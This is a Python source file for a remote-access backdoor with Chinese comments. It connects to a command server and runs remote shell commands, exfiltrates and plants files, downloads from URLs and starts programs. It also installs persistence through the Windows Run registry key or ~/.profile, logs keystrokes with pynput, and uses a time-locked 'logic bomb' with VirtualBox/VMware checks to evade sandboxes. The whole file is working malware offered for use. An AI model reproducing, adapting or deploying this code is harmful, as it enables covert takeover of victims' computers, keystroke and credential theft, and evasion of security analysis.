#!/usr/bin/python3
import socket
import subprocess
import json
import time
import os
import sys
import shutil
import base64
import struct
import requests
import tempfile
import threading
import pynput.keyboard

SERVER_IP = "127.0.0.1"
SERVER_PORT = 12345

keys = []

# 支援跨平台的持久化路徑
if sys.platform.startswith("win"):
    FILE_LOCATION = os.path.join(os.environ.get("appdata", "C:\\"), "srv.exe")
else:
    FILE_LOCATION = os.path.expanduser("~/.local/bin/srv")

def recv_all(s, n):
    """
    確保從 socket 讀取精確的 n 個 bytes，防止 TCP 緩衝區分段問題
    """
    data = bytearray()
    while len(data) < n:
        packet = s.recv(n - len(data))
        if not packet:
            return None
        data.extend(packet)
    return bytes(data)

def reliable_send(s, data):
    json_data = json.dumps(data).encode("utf-8")
    data_len = struct.pack(">I", len(json_data))
    s.sendall(data_len + json_data)

def reliable_recv(s):
    try:
        header = recv_all(s, 4)
        if not header:
            return None
        data_len = struct.unpack(">I", header)[0]
        
        data = recv_all(s, data_len)
        if not data:
            return None
            
        return json.loads(data.decode("utf-8"))
    except (socket.error, json.JSONDecodeError):
        return None

def logic_bomb():
    """
    邏輯炸彈 (Logic Bomb)：
    檢查特定條件是否滿足。若條件不滿足，則拒絕執行後續的後門連線。
    """
    # 1. 時間鎖：必須在 2026-05-21 00:00:00 UTC 之後執行 (timestamp: 1779340800)
    target_time = 1779340800
    if time.time() < target_time:
        return False

    # 2. 簡單沙箱防禦檢測：若檢測到常見虛擬機/沙箱驅動或路徑，則不執行
    sandbox_files = [
        "C:\\windows\\System32\\Drivers\\Vmmouse.sys",
        "C:\\windows\\System32\\Drivers\\VboxMouse.sys",
    ]
    for file in sandbox_files:
        if os.path.exists(file):
            return False

    return True

def persist():
    """
    實現跨平台的持久化 (Persistence)
    """
    try:
        if sys.platform.startswith("win"):
            if not os.path.exists(FILE_LOCATION):
                # 如果是打包好的執行檔，sys.executable 指向 exe，否則指向 python 檔
                src_path = sys.executable if sys.executable.endswith(".exe") else sys.argv[0]
                shutil.copyfile(src_path, FILE_LOCATION)
                # 使用 raw string 避免 Windows 路徑轉義錯誤
                cmd = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v ServiceCheck /t REG_SZ /d "{FILE_LOCATION}" /f'
                subprocess.run(cmd, shell=True, capture_output=True)
        elif sys.platform.startswith("linux") or sys.platform.startswith("darwin"):
            home = os.path.expanduser("~")
            dest_dir = os.path.dirname(FILE_LOCATION)
            os.makedirs(dest_dir, exist_ok=True)
            
            if not os.path.exists(FILE_LOCATION):
                shutil.copyfile(sys.argv[0], FILE_LOCATION)
                os.chmod(FILE_LOCATION, 0o755)
                
                # 寫入 ~/.profile 或 ~/.bashrc 確保登入時背景執行
                profile_path = os.path.join(home, ".profile")
                if not os.path.exists(profile_path):
                    profile_path = os.path.join(home, ".bashrc")
                
                if os.path.exists(profile_path):
                    with open(profile_path, "a") as f:
                        f.write(f"\n# Service check\n(nohup {FILE_LOCATION} >/dev/null 2>&1 &)\n")
    except Exception:
        pass

def process_keys(key):
    global keys
    
    try:
        keys.append(str(key.char))
    except AttributeError:
        if key == pynput.keyboard.Key.enter:
            keys.append("\n")
        elif key == pynput.keyboard.Key.space:
            keys.append(" ")
        elif key == pynput.keyboard.Key.backspace:
            if keys:
                keys.pop()
        elif key == pynput.keyboard.Key.tab:
            keys.append("\t")
        elif key == pynput.keyboard.Key.up:
            exit
        elif key == pynput.keyboard.Key.left:
            exit
        elif key == pynput.keyboard.Key.right:
            exit
        elif key == pynput.keyboard.Key.down:
            exit
        else:
            keys.append(f"[{key.name.upper()}]")

def writekeys():
    global keys
    kl_file = os.environ["appdata"] + "\\srv.txt"
    with open(kl_file, "a") as klfile:
        klfile.write("".join(keys))
    keys.clear()
    timer = threading.Timer(5, writekeys)
    timer.start()

def kl_start():
    keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)
    writekeys()
    with keyboard_listener:
        keyboard_listener.join()

def communication(s):
    while True:
        command = reliable_recv(s)
        if command is None or command == 'q':
            break
            
        if command.startswith("cd ") and len(command) > 3:
            try:
                os.chdir(command[3:].strip())
                # 可以選擇回傳成功訊息，或保持原樣
            except OSError:
                continue
                
        elif command.startswith("download "):
            filename = command[9:].strip()
            try:
                with open(filename, "rb") as f:
                    content = f.read()
                    encoded = base64.b64encode(content).decode("ascii")
                    reliable_send(s, encoded)
            except Exception:
                reliable_send(s, "[!!] Failed to download: File not found or unreadable.")
                
        elif command.startswith("upload "):
            filename = command[7:].strip()
            result = reliable_recv(s)
            if result and not result.startswith("[!!]"):
                try:
                    with open(filename, "wb") as f:
                        f.write(base64.b64decode(result.encode("ascii")))
                except Exception:
                    pass
                    
        elif command.startswith("get "):
            url = command[4:].strip()
            try:
                response = requests.get(url, timeout=10)
                filename = url.split("/")[-1] if "/" in url else "downloaded_file"
                with open(filename, "wb") as f:
                    f.write(response.content)
                reliable_send(s, f"[+] File '{filename}' Downloaded via HTTP.")
            except Exception as e:
                reliable_send(s, f"[!!] HTTP Download Failed: {e}")
                
        elif command.startswith("start "):
            program = command[6:].strip()
            try:
                subprocess.Popen(program, shell=True)
                reliable_send(s, f"[+] Program '{program}' Started.")
            except Exception:
                reliable_send(s, "[!!] Program cannot start.")
                
        elif command == "kl_start":
            kl_thread = threading.Thread(target=kl_start, daemon=True)
            kl_thread.start()
            reliable_send(s, "[+] Keylogger Started.")

        else:
            # 執行 Shell 指令並獲取結果
            try:
                proc = subprocess.Popen(
                    command, 
                    shell=True,
                    stdout=subprocess.PIPE, 
                    stderr=subprocess.PIPE, 
                    stdin=subprocess.PIPE
                )
                stdout, stderr = proc.communicate()
                response = stdout + stderr
                # 依據平台與系統編碼進行解碼
                try:
                    if sys.platform.startswith("win"):
                        decoded_response = response.decode('cp950')
                    else:
                        decoded_response = response.decode('utf-8')
                except UnicodeDecodeError:
                    decoded_response = response.decode('utf-8', errors='ignore')
                
                reliable_send(s, decoded_response)
            except Exception as e:
                reliable_send(s, f"[!!] Execution Error: {str(e)}")

def connection():
    while True:
        try:
            # 每次連線都建立一個新的 socket 實例
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((SERVER_IP, SERVER_PORT))
                communication(s)
        except socket.error:
            # 連線失敗時，等待 20 秒後重試（確保不會因 Server 短暫關閉而崩潰退出）
            time.sleep(20)
            continue

if __name__ == "__main__":
    # 執行邏輯炸彈條件檢查，如果不通過則退出
    if not logic_bomb():
        sys.exit(0)
    
    # 在進入主迴圈前嘗試執行持久化
    persist()
    
    # 開始連線
    connection()